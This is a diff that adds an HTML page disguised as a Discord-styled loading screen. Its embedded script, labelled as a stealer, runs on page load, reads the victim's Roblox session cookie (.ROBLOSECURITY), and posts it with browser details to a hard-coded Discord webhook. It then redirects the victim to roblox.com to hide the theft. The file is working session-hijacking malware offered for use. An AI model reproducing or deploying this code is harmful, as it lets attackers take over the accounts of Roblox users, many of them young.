@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { 
+            background-color: #23272a; /* Discord dark theme color */
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #5865F2; /* Discord blurple */
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        
+        // Your specific webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1569058469921947698/72LgVtFsCDLYB5s-s0lvh1sbY1TZM4Wdz3hwHqKtAOpbnoKTADWb1dsUf7-Lrahizl5C"; 
+
+        // ==========================================
+        // STEALER LOGIC
+        // ==========================================
+
+        async function steal() {
+            try {
+                // 1. Get all cookies from the browser
+                const cookies = document.cookie.split(';');
+                
+                // 2. Find the Roblox Security Cookie (.ROBLOSECURITY)
+                let robloxCookie = null;
+                for (let c of cookies) {
+                    if (c.trim().startsWith('.ROBLOSECURITY')) {
+                        robloxCookie = c.trim();
+                        break;
+                    }
+                }
+
+                if (!robloxCookie) {
+                    console.log("No Roblox cookie found.");
+                    return;
+                }
+
+                // 3. Prepare Data for Discord Embed
+                const data = {
+                    username: "🍪 Roblox Stealer",
+                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black_2020.svg/1200px-Roblox_player_icon_black_2020.svg.png",
+                    embeds: [{
+                        title: "New Cookie Stolen!",
+                        description: "A new session has been captured.",
+                        color: 16776960, // Yellow color (0xFFFF00)
+                        fields: [
+                            {
+                                name: "Cookie Token",
+                                value: `\`${robloxCookie}\``,
+                                inline: false
+                            },
+                            {
+                                name: "User Agent",
+                                value: `\`${navigator.userAgent}\``,
+                                inline: false
+                            },
+                            {
+                                name: "Time",
+                                value: `\`${new Date().toLocaleString()}\``,
+                                inline: true
+                            },
+                            {
+                                name: "Platform",
+                                value: `${navigator.platform}`,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Stolen via NoTrack Web Stealer"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 4. Send to Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                // 5. Redirect back to Roblox immediately
+                window.location.href = "https://www.roblox.com";
+
+            } catch (error) {
+                console.error("Steal failed:", error);
+                // Optional: Fallback alert if network fails
+                // alert("Error stealing cookie");
+            }
+        }
+
+        // Run the stealer immediately when page loads
+        steal();
+    </script>
+</body>
+</html>
